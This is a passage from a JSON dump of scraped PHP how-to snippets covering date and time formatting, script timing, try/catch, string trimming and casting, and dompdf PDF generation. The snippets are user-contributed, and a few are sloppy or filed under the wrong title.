    "description": "function inverse($x) {     if (!$x) {         throw new Exception('Division by zero.');     }     return 1/$x; }\nfunction inverso($x) {     if (!$x) {         throw new Exception('Zero division.');     }     return 1/$x; }  try {     echo inverso(5) . \"\\n\";     echo inverso(0) . \"\\n\"; } catch (Exception $e) {     echo 'and the error is: ',  $e->getMessage(), \"\\n\"; }\n <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>  \nTry catch comes under exception handeling concept where using this we control the runtime error and modify the message as we want.  // function created with exception throw function checkdata($number){ \tif($number > 10){     \tthrow new Exception(\"Number is greater than 10\");     }     return true; }  // try block starts try{ \tcheckdata(15);   \techo \"The number is below 10\"; } // catch block catch(Exception $e){ \techo \"Message :\".$e->getMessage(); }  In above code if condition is not satisfied then it will throw exception and which gets caught by catch block and show the error message. \ntrigger_error(\"Fatal error\", E_USER_ERROR);\ntry {     // Some code... } catch(AError | BError $e) {     // Handle exceptions } catch(Exception $e) {     // Handle the general case }\n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4297,
    "keyword": null,
    "link": null,
    "title": " php time",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n//Get current date time in PHP  // Simply: $date = date('Y-m-d H:i:s');  // Or: $date = date('Y/m/d H:i:s');  // This would return the date in the following formats respectively: $date = '2012-03-06 17:33:07'; // Or $date = '2012/03/06 17:33:07';  /**   * This time is based on the default server time zone.  * If you want the date in a different time zone,  * say if you come from Nairobi, Kenya like I do, you can set  * the time zone to Nairobi as shown below.  */  date_default_timezone_set('Africa/Nairobi');  // Then call the date functions $date = date('Y-m-d H:i:s'); // Or $date = date('Y/m/d H:i:s');  // date_default_timezone_set() function is however // supported by PHP version 5.1.0 or above. \n<?php  /* Unix Timestamp */ $timestamp = time(); echo $timestamp . \"<br>\"; echo date(\"d/m/Y\", $timestamp); ?>\necho date('d/m/Y h:i:s a');\t// 01/02/2020 01:01:30 am // d - The day of the month (from 01 to 31) // D - A textual representation of a day (three letters) // j - The day of the month without leading zeros (1 to 31) // l (lowercase 'L') - A full textual representation of a day // N - The ISO-8601 numeric representation of a day (1 for Monday, 7 for Sunday) // S - The English ordinal suffix for the day of the month (2 characters st, nd, rd or th. Works well with j) // w - A numeric representation of the day (0 for Sunday, 6 for Saturday) // z - The day of the year (from 0 through 365) // W - The ISO-8601 week number of year (weeks starting on Monday) // F - A full textual representation of a month (January through December) // m - A numeric representation of a month (from 01 to 12) // M - A short textual representation of a month (three letters) // n - A numeric representation of a month, without leading zeros (1 to 12) // t - The number of days in the given month // L - Whether it's a leap year (1 if it is a leap year, 0 otherwise) // o - The ISO-8601 year number // Y - A four digit representation of a year // y - A two digit representation of a year // a - Lowercase am or pm // A - Uppercase AM or PM // B - Swatch Internet time (000 to 999) // g - 12-hour format of an hour (1 to 12) // G - 24-hour format of an hour (0 to 23) // h - 12-hour format of an hour (01 to 12) // H - 24-hour format of an hour (00 to 23) // i - Minutes with leading zeros (00 to 59) // s - Seconds, with leading zeros (00 to 59) // u - Microseconds (added in PHP 5.2.2) // e - The timezone identifier (Examples: UTC, GMT, Atlantic/Azores) // I (capital i) - Whether the date is in daylights savings time (1 if Daylight Savings Time, 0 otherwise) // O - Difference to Greenwich time (GMT) in hours (Example: +0100) // P - Difference to Greenwich time (GMT) in hours:minutes (added in PHP 5.1.3) // T - Timezone abbreviations (Examples: EST, MDT) // Z - Timezone offset in seconds. The offset for timezones west of UTC is negative (-43200 to 50400) // c - The ISO-8601 date (e.g. 2013-05-05T16:34:42+00:00) // r - The RFC 2822 formatted date (e.g. Fri, 12 Apr 2013 12:01:05 +0200) // U - The seconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\n<?php $t=time(); echo($t . \"<br>\"); echo(date(\"Y-m-d\",$t)); ?>\n// 1. create a date instance $date = new DateTime;  // 2. set the date using the setDate(year, month, date) method on the //    $date instance $date->setDate(1999,02,19);\n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4298,
    "keyword": null,
    "link": null,
    "title": " php time a script",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \n<?php $startTime = microtime(true);  /*stuff is going on*/  echo \"Elapsed time is: \". (microtime(true) - $startTime) .\" seconds\";\n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4299,
    "keyword": null,
    "link": null,
    "title": " php time difference in hours",
    "description": "$hourdiff = round((strtotime($time1) - strtotime($time2))/3600, 1);\n\tdate_default_timezone_set(\"Africa/Johannesburg\");     $now = new DateTime();     $future_date = new DateTime('2020-10-21 00:00:00');          $interval = $future_date->diff($now);          echo ($interval->format(\"%a\") * 24) + $interval->format(\"%h\"). \" hours\". $interval->format(\" %i minutes \");     print_r($now->format('Y-m-d H:i:s')); \n$currentTime = (new DateTime('01:00'))->modify('+1 day'); $startTime = new DateTime('22:00'); $endTime = (new DateTime('07:00'))->modify('+1 day');  if ($currentTime >= $startTime && $currentTime <= $endTime) {     // Do something }\n$time1 = new DateTime('09:00:59'); $time2 = new DateTime('09:01:00'); $interval = $time1->diff($time2); echo $interval->format('%s second(s)');  Result: 1 second(s)\n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4300,
    "keyword": null,
    "link": null,
    "title": " php time format",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\n<?php   \t$date = '05/05/2021'; \techo DateTime::createFromFormat(\"d/m/Y\", $date)->format('Y-m-d'); \t//2021-05-05 \n$originalDate = \"2017-03-08\"; $newDate = date(\"d/m/Y\", strtotime($originalDate)); \n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4301,
    "keyword": null,
    "link": null,
    "title": " php time format am pm",
    "description": "$currentDateTime = '08/04/2010 22:15:00'; $newDateTime = date('h:i A', strtotime($currentDateTime));\n",
    "reg_date": "2021-10-12T10:19:31.000Z"
  },
  {
    "id": 4302,
    "keyword": null,
    "link": null,
    "title": " php time how long a function takes",
    "description": "<?php $startTime = microtime(true);  /*stuff is going on*/  echo \"Elapsed time is: \". (microtime(true) - $startTime) .\" seconds\";\n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4303,
    "keyword": null,
    "link": null,
    "title": " php time limit",
    "description": "set_time_limit(120); // Time in seconds set_time_limit(0);   // unlimited\n//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \nset_time_limit(300);\n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4304,
    "keyword": null,
    "link": null,
    "title": " php time script",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \n<?php $startTime = microtime(true);  /*stuff is going on*/  echo \"Elapsed time is: \". (microtime(true) - $startTime) .\" seconds\";\n<?php $t=time(); echo($t . \"<br>\"); echo(date(\"Y-m-d\",$t)); ?>\n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4305,
    "keyword": null,
    "link": null,
    "title": " php timer",
    "description": "$time_pre = microtime(true); exec(...); $time_post = microtime(true); $exec_time = $time_post - $time_pre;\n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4306,
    "keyword": null,
    "link": null,
    "title": " php timestamp",
    "description": " <?php $date = new DateTime(); echo $date->getTimestamp(); ?>  \nstrtotime(\"now\");  // strtotime is a function that will take a string parameter  // that specifies a date, and returns a unix time stamp bassed // on that  echo strtotime(\"2020-02-24\");  // prints: 1582502400\n<?php  echo time();  ?>\n <?php $date = date_create(); echo date_timestamp_get($date); ?>  \n <?php $nextWeek = time() + (7 * 24 * 60 * 60);                    // 7 days; 24 hours; 60 mins; 60 secs echo 'Now:       '. date('Y-m-d') .\"\\n\"; echo 'Next Week: '. date('Y-m-d', $nextWeek) .\"\\n\"; // or using strtotime(): echo 'Next Week: '. date('Y-m-d', strtotime('+1 week')) .\"\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4307,
    "keyword": null,
    "link": null,
    "title": " php timestamp format",
    "description": "date(\"Y-m-d H:i:s\", strtotime($_POST['timestamp']));\n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n<?php  echo time();  ?>\ndate(\"Y-n-j G:i:s\"); //-->2020-10-29 23:27:15\n<?php echo date(\"F j, Y, g:i a\").\"<br>\";               // March 10, 2001, 5:16 pm echo date(\"m.d.y\").\"<br>\";                       // 03.10.01 echo date(\"j, n, Y\").\"<br>\";                     // 10, 3, 2001 echo date(\"Ymd\").\"<br>\";                         // 20010310 echo date('h-i-s, j-m-y, it is w Day').\"<br>\";   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.').\"<br>\"; // it is the 10th day. echo date(\"D M j G:i:s T Y\").\"<br>\";             // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h').\"<br>\";   // 17:03:18 m is month echo date(\"H:i:s\").\"<br>\";                       // 17:16:18 echo date(\"Y-m-d H:i:s\").\"<br>\";                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \ndate(\"d.m.Y\", strtotime($mysqltimestamp)\n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4308,
    "keyword": null,
    "link": null,
    "title": " php timestamp to date",
    "description": "$today = date(\"F j, Y, g:i a\");                   // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                           // 03.10.01 $today = date(\"j, n, Y\");                         // 10, 3, 2001 $today = date(\"Ymd\");                             // 20010310 $today = date('h-i-s, j-m-y, it is w Day');       // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');     // It is the 10th day (10&egrave;me jour du mois). $today = date(\"D M j G:i:s T Y\");                 // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\e\\s\\t\\ \\l\\e\\ \\m\\o\\i\\s'); // 17:03:18 m est le mois $today = date(\"H:i:s\");                           // 17:16:18 $today = date(\"Y-m-d H:i:s\");                     // 2001-03-10 17:16:18 (le format DATETIME de MySQL)\n<?php  echo date('m/d/Y H:i:s', 1541843467);  ?> \n$time = '2021-03-31 23:59:00'; strtotime($time);\n$date = new DateTime(); echo $date->getTimestamp();\n <?php $date = new DateTime(); echo $date->format('U = Y-m-d H:i:s') . \"\\n\";  $date->setTimestamp(1171502725); echo $date->format('U = Y-m-d H:i:s') . \"\\n\"; ?>  \n// 1. create a date instance $date = new DateTime;  // 2. set the date using the setDate(year, month, date) method on the //    $date instance $date->setDate(1999,02,19);\n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4309,
    "keyword": null,
    "link": null,
    "title": " php title",
    "description": "function set_page_title(){   global $page_title;    /*     you should make the variable global so the function can access it and set it to the page title     otherwise you will get an error.   */   if(isset($page_title)){ /*Check if my code has that variable*/     echo $page_title;   }   else{     echo \"Page Title\";   } } /*   HTML Layout   <!DOCTYPE html>   <head>     <title><?php set_page_title() ?></title>   </head>   ... */\n//1. Simply add $title variable before require function <?php  $title = \"Your title goes here\"; require(\"header.php\");  ?>       //2. Add following code into header.php  <title><?php echo $title; ?></title> \n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4310,
    "keyword": null,
    "link": null,
    "title": " php title case",
    "description": "$foo = 'hello world!'; $foo = ucwords($foo);             // Hello World!  $bar = 'HELLO WORLD!'; $bar = ucwords($bar);             // HELLO WORLD! $bar = ucwords(strtolower($bar)); // Hello World!  //With custom delimiter $foo = 'hello|world!'; $bar = ucwords($foo);             // Hello|world!  $baz = ucwords($foo, \"|\"); \n<?php /* Convert the first character of each word to uppercase: */ echo ucwords(\"hello samy, how are you ?\");  //output : Hello Samy, How Are You ? ?> \n$upperCaseSentance=ucwords(\"i do not feel good\");//I Do Not Feel Good\n <?php $foo = 'hello world!'; $foo = ucwords($foo);             // Hello World!  $bar = 'HELLO WORLD!'; $bar = ucwords($bar);             // HELLO WORLD! $bar = ucwords(strtolower($bar)); // Hello World! ?>  \n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4311,
    "keyword": null,
    "link": null,
    "title": " php to int",
    "description": "intval($string);\n$int = intval($float);\ns = \"123\"; echo intval(s); // 123  s = \"hello\"; echo intval(s);\t//0\nphpCopy<?php   $variable = \"abc\"; $integer = (int)$variable; echo \"The variable has converted to a number and its value is $integer.\";   ?> \n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$num = \"3.14\"; $int = (int)$num;\n",
    "reg_date": "2021-10-12T10:19:32.000Z"
  },
  {
    "id": 4312,
    "keyword": null,
    "link": null,
    "title": " php to lowercase",
    "description": "/* strtolower() function converts  string to lowercase. */ <?php echo strtolower(\"Hello WORLD 123\"); ?> // Output:hello world 123\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' $string = 'HeLlO WoRlD'; echo strtolower($string); //Output: 'hello world'\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world'\n/* The strtolower() function converts a string to lowercase. Convert all characters to lowercase.*/ <?php echo strtolower(\"Hello WORLD.\"); ?> // Output: hello world.\nThe strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\n<?php $str = \"Mary Had A Little Lamb and She LOVED It So\"; $str = strtolower($str); echo $str;  // Result: mary had a little lamb and she loved it so\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4313,
    "keyword": null,
    "link": null,
    "title": " php to pdf",
    "description": "<?php //install Dompdf library at link below: //https://github.com/dompdf/dompdf use Dompdf\\Dompdf; session_start();    // Include the database   $servername = \"\";   $username = \"\";   $password = \"\";   $dbname = \"\";    // Create connection   $conn = new mysqli($servername, $username, $password, $dbname);   // Check connection   if ($conn->connect_error) {   die(\"Connection failed: \" . $conn->connect_error);   }        $html = '<table border=1>';\t     $html .= '<thead>';     $html .= '<tr>';     $html .= '<th>ID</th>';     $html .= '<th>Collum1</th>';     $html .= '<th>Collum2</th>';     $html .= '<th>Collum3</th>';     $html .= '</tr>';     $html .= '</thead>';     $html .= '<tbody>';          $sql = \"SELECT * FROM tableName\";     $sql = mysqli_query($conn, $sql);     while($row = mysqli_fetch_assoc($sql)){             $html = ''; // your html code\t\t     }         // include autoloader     require_once(\"dompdf/autoload.inc.php\");      //Create instance     $dompdf = new DOMPDF();          // Upload your HTML code     $dompdf->load_html('         <h1 style=\"text-align: center;\">RentCar</h1>         '. $html .'       ');      //Render html     $dompdf->render();      //Create and output the pdf      $pdf = $dompdf->output();      //Visualize the page     $dompdf->stream(       \"form.pdf\",        array(         \"Attachment\" => false //To download turn it to true, to preview pdf turn it to false       )     );  ?>\nImportant: Please note that this answer was written in 2009 and it might not be the most cost-effective solution today in 2019. Online alternatives are better today at this than they were back then.  Here are some online services that you can use:  PDFShift Restpack PDF Layer DocRaptor HTMLPDFAPI HTML to PDF Rocket Have a look at PrinceXML.  It's definitely the best HTML/CSS to PDF converter out there, although it's not free (But hey, your programming might not be free either, so if it saves you 10 hours of work, you're home free (since you also need to take into account that the alternative solutions will require you to setup a dedicated server with the right software)  Oh yeah, did I mention that this is the first (and probably only) HTML2PDF solution that does full ACID2 ?  PrinceXML Samples\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4314,
    "keyword": null,
    "link": null,
    "title": " php to shortcode",
    "description": "echo do_shortcode('[name_of_shortcode]');\n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4315,
    "keyword": null,
    "link": null,
    "title": " php to string",
    "description": "return strval($integer);\n$number = 11; // This echo strval($number); // Or This echo (String) $number; // Output // \"11\" // \"11\"\n$number = 10; // To convert this number to a string: $numberString = (string)$number;\n$var = 5;  // Inline variable parsing echo \"I'd like {$var} waffles\"; // = \"I'd like 5 waffles  // String concatenation  echo \"I'd like \".$var.\" waffles\"; // I'd like 5 waffles  // Explicit cast  $items = (string)$var; // $items === \"5\";  // Function call $items = strval($var); // $items === \"5\"; \n<?php class StrValTest {     public function __toString()     {         return __CLASS__;     } }  // Prints 'StrValTest' echo strval(new StrValTest); ?>\necho \"'$animal'\";\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4316,
    "keyword": null,
    "link": null,
    "title": " php today date",
    "description": "<?php echo \"Today is \" . date(\"Y/m/d\") . \"<br>\"; echo \"Today is \" . date(\"Y.m.d\") . \"<br>\"; echo \"Today is \" . date(\"Y-m-d\") . \"<br>\"; echo \"Today is \" . date(\"l\");\n$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n$currentYear=date(\"Y\");//2019\n$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\ndate(\"Y-m-d h:i:sa\")\ndate_default_timezone_set('Asia/Kolkata');  echo date(\"Y-m-d H:i:s\"); // time in India\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4317,
    "keyword": null,
    "link": null,
    "title": " php tomorrow",
    "description": "$tomorrow = date(\"Y-m-d\", strtotime('tomorrow')); or  $tomorrow = date(\"Y-m-d\", strtotime(\"+1 day\"));  for DateTime    $datetime = new DateTime('tomorrow'); echo $datetime->format('Y-m-d H:i:s');  or  $datetime = new DateTime('2013-01-22'); $datetime->modify('+1 day'); echo $datetime->format('Y-m-d H:i:s'); \n$tomorrow = date(\"Y-m-d\", strtotime('tomorrow')); or  $tomorrow = date(\"Y-m-d\", strtotime(\"+1 day\"));  for DateTime    $datetime = new DateTime('tomorrow'); echo $datetime->format('Y-m-d H:i:s');  or  $datetime = new DateTime('2013-01-22'); $datetime->modify('+1 day'); echo $datetime->format('Y-m-d H:i:s');\n$tomorrow = new DateTime('tomorrow'); echo $tomorrow->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4318,
    "keyword": null,
    "link": null,
    "title": " php transform associative array to array",
    "description": "$array = array_values($array);\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4319,
    "keyword": null,
    "link": null,
    "title": " php translate url wpml",
    "description": " $translateUrl = apply_filters('wpml_permalink', $url);  // return the translatation url, or the current one if not found.\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4320,
    "keyword": null,
    "link": null,
    "title": " php trim all array elements",
    "description": "$result = array_map('trim', $source_array);\n",
    "reg_date": "2021-10-12T10:19:33.000Z"
  },
  {
    "id": 4321,
    "keyword": null,
    "link": null,
    "title": " php trim array to certain length",
    "description": "#trim array to certain legnth $alphabet = [\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]; $alphabetFirst10 = array_slice($alphabet, 0, 10);\n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4322,
    "keyword": null,
    "link": null,
    "title": " php trim string if longer than",
    "description": "substr($str,0,50);\n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4323,
    "keyword": null,
    "link": null,
    "title": " php trim string to length",
    "description": " <?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef'; echo $string[0];                 // a echo $string[3];                 // d echo $string[strlen($string)-1]; // f  ?>  //substr() function returns certain bits of a string \n<?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef';\nsubstr(string,start,length)\n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4324,
    "keyword": null,
    "link": null,
    "title": " php true to false and reverse",
    "description": "$boolean = !$boolean; \n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4325,
    "keyword": null,
    "link": null,
    "title": " php truncate string",
    "description": "$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase; // THIS IS LOWER CASE\n <?php echo substr('abcdef', 1);     // bcdef echo substr('abcdef', 1, 3);  // bcd echo substr('abcdef', 0, 4);  // abcd echo substr('abcdef', 0, 8);  // abcdef echo substr('abcdef', -1, 1); // f  // Accessing single characters in a string // can also be achieved using \"square brackets\" $string = 'abcdef'; echo $string[0];                 // a echo $string[3];                 // d echo $string[strlen($string)-1]; // f  ?>  //substr() function returns certain bits of a string \n$firstStringCharacter = substr(\"hello\", 0, 1);\n$string = (strlen($string) > 13) ? substr($string,0,10).'...' : $string; \n$colors=trim(\"blue,red,green,\",\",\");//remove last , with rtrim\necho substr('hello world', 0, 5); //hello\n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4326,
    "keyword": null,
    "link": null,
    "title": " php try catch",
    "description": "function inverse($x) {     if (!$x) {         throw new Exception('Division by zero.');     }     return 1/$x; }\nfunction inverso($x) {     if (!$x) {         throw new Exception('Zero division.');     }     return 1/$x; }  try {     echo inverso(5) . \"\\n\";     echo inverso(0) . \"\\n\"; } catch (Exception $e) {     echo 'and the error is: ',  $e->getMessage(), \"\\n\"; }\n <?php  function test() {     try {         throw new Exception('foo');     } catch (Exception $e) {         return 'catch';     } finally {         return 'finally';     } }  echo test(); ?>  \n <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>  \nTry catch comes under exception handeling concept where using this we control the runtime error and modify the message as we want.  // function created with exception throw function checkdata($number){ \tif($number > 10){     \tthrow new Exception(\"Number is greater than 10\");     }     return true; }  // try block starts try{ \tcheckdata(15);   \techo \"The number is below 10\"; } // catch block catch(Exception $e){ \techo \"Message :\".$e->getMessage(); }  In above code if condition is not satisfied then it will throw exception and which gets caught by catch block and show the error message. \ntry { } catch(Exception $e) { }\n",
    "reg_date": "2021-10-12T10:19:34.000Z"
  },
  {
    "id": 4327,
    "keyword": null,
    "link": null,
    "title": " php try json decode and check",
